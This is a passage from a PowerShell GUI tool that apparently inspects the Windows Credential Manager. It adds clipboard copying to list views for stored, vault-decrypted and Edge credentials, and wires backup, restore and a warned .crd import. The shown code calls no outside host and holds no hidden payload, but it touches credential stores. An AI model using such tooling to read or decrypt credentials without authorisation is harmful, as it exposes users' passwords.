            if (-not [string]::IsNullOrEmpty($text)) {
                [System.Windows.Forms.Clipboard]::SetText($text)
                [System.Windows.Forms.MessageBox]::Show("Column headers copied to clipboard:`n`n$text", "Copy Successful", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
            }
        }
        catch { [System.Windows.Forms.MessageBox]::Show("Copy error: $_", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null }
    })
    [void]$contextMenu.Items.Add($copyColumnHeadersMenu)

    $ListView.ContextMenuStrip = $contextMenu
}

# Add keyboard shortcut (Ctrl+C) for copy
function Add-ListViewKeyboardShortcuts {
    param(
        [System.Windows.Forms.ListView]$ListView
    )

    $ListView.Add_KeyDown({
        if ($_.KeyCode -eq [System.Windows.Forms.Keys]::C -and $_.Control) {
            $_.Handled = $true
            try {
                $lv = $this
                if ($lv.SelectedIndices.Count -eq 0) {
                    [System.Windows.Forms.MessageBox]::Show("No item selected. Press Ctrl+C on a selected item to copy.", "Copy", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
                    return
                }
                $selectedIndex = $lv.SelectedIndices[0]
                $item = $lv.Items[$selectedIndex]
                $text = $item.Text
                foreach ($subItem in $item.SubItems) {
                    if ($subItem -ne $item) {
                        $text += "`t" + $subItem.Text
                    }
                }
                if (-not [string]::IsNullOrEmpty($text)) {
                    [System.Windows.Forms.Clipboard]::SetText($text)
                    [System.Windows.Forms.MessageBox]::Show("Copied to clipboard:`n`n$text", "Copy Successful", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
                }
            }
            catch {
                [System.Windows.Forms.MessageBox]::Show("Keyboard copy error: $_", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
            }
        }
    })
}

# Attach context menus and keyboard shortcuts to all diagnostic list views
Add-ListViewContextMenu -ListView $Global:DiagnosticListViews['WinCreds'] -ListViewName "WinCreds"
Add-ListViewContextMenu -ListView $Global:DiagnosticListViews['PasswordVault'] -ListViewName "PasswordVault"
Add-ListViewContextMenu -ListView $Global:DiagnosticListViews['Edge'] -ListViewName "EdgeDiagnostics"
Add-ListViewContextMenu -ListView $Global:DiagnosticListViews['VaultDecrypt'] -ListViewName "VaultDecrypt"
Add-ListViewContextMenu -ListView $Global:DiagnosticListViews['Vaultcmd'] -ListViewName "Vaultcmd"
Add-ListViewContextMenu -ListView $Global:DiagnosticListViews['ErrorLog'] -ListViewName "ErrorLog"

Add-ListViewKeyboardShortcuts -ListView $Global:DiagnosticListViews['WinCreds']
Add-ListViewKeyboardShortcuts -ListView $Global:DiagnosticListViews['PasswordVault']
Add-ListViewKeyboardShortcuts -ListView $Global:DiagnosticListViews['Edge']
Add-ListViewKeyboardShortcuts -ListView $Global:DiagnosticListViews['VaultDecrypt']
Add-ListViewKeyboardShortcuts -ListView $Global:DiagnosticListViews['ErrorLog']
Add-ListViewKeyboardShortcuts -ListView $Global:DiagnosticListViews['Vaultcmd']

# Also add to main credential list views for consistency
Add-ListViewContextMenu -ListView $ListViewWeb -ListViewName "WebCredentials"
Add-ListViewContextMenu -ListView $LV_EdgeTab -ListViewName "EdgeDiagnostics"
Add-ListViewContextMenu -ListView $LV_WinCore -ListViewName "WindowsCore"
Add-ListViewContextMenu -ListView $LV_WinCert -ListViewName "WindowsCertificate"
Add-ListViewContextMenu -ListView $LV_WinGen -ListViewName "WindowsGeneric"

Add-ListViewKeyboardShortcuts -ListView $ListViewWeb
Add-ListViewKeyboardShortcuts -ListView $LV_EdgeTab
Add-ListViewKeyboardShortcuts -ListView $LV_WinCore
Add-ListViewKeyboardShortcuts -ListView $LV_WinCert
Add-ListViewKeyboardShortcuts -ListView $LV_WinGen

# ===================================================================

$BtnBackup.Add_Click({ Start-Process "rundll32.exe" -ArgumentList "keymgr.dll,PRShowSaveWizardExW" -Wait; Refresh-TabbedUI })
$BtnRestore.Add_Click({ Start-Process "rundll32.exe" -ArgumentList "keymgr.dll,PRShowRestoreWizardExW" -Wait; Refresh-TabbedUI })
$BtnImportCrd.Add_Click({
    $warningResult = [System.Windows.Forms.MessageBox]::Show(
        "Importing a .crd file for diagnostics is unsafe.`n`nWindows restores the backup into the live credential store before this script can inspect it. If restore or rollback is interrupted, credentials could be added, overwritten, or left behind.`n`nUse an isolated account or disposable VM when possible.`n`nDo you want to continue?",
        "Unsafe .crd Diagnostic Import",
        [System.Windows.Forms.MessageBoxButtons]::OKCancel,
        [System.Windows.Forms.MessageBoxIcon]::Warning
    )

    if ($warningResult -ne [System.Windows.Forms.DialogResult]::OK) {
        return
    }

    $ofd = New-Object System.Windows.Forms.OpenFileDialog
    $ofd.Title = "Import Credential Manager Backup File"
    $ofd.Filter = "Credential Backup Files (*.crd)|*.crd|All Files (*.*)|*.*"
    $ofd.Multiselect = $false

    if ($ofd.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
        try {
            $result = Import-CrdBackupFile -FilePath $ofd.FileName -AllowDuplicates

            if ($result.Success) {
                $msg = if ($result.Message) { $result.Message } else { "Successfully imported $($result.ImportedCount) credential(s)" }
                if ($result.SkippedCount -gt 0) {
                    $msg += " ($($result.SkippedCount) skipped)"
                }
                [System.Windows.Forms.MessageBox]::Show($msg, "Import Successful", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
            }
            else {
                [System.Windows.Forms.MessageBox]::Show($result.Message, "Import Failed", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
            }
        }
        catch {
            [System.Windows.Forms.MessageBox]::Show("Error: $_", "Import Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
        }
    }
})
$BtnClose.Add_Click({ $MainForm.Close() })
$MainForm.Add_Load({ Load-ImportedCredentials; Refresh-TabbedUI })

[System.Windows.Forms.Application]::Run($MainForm)
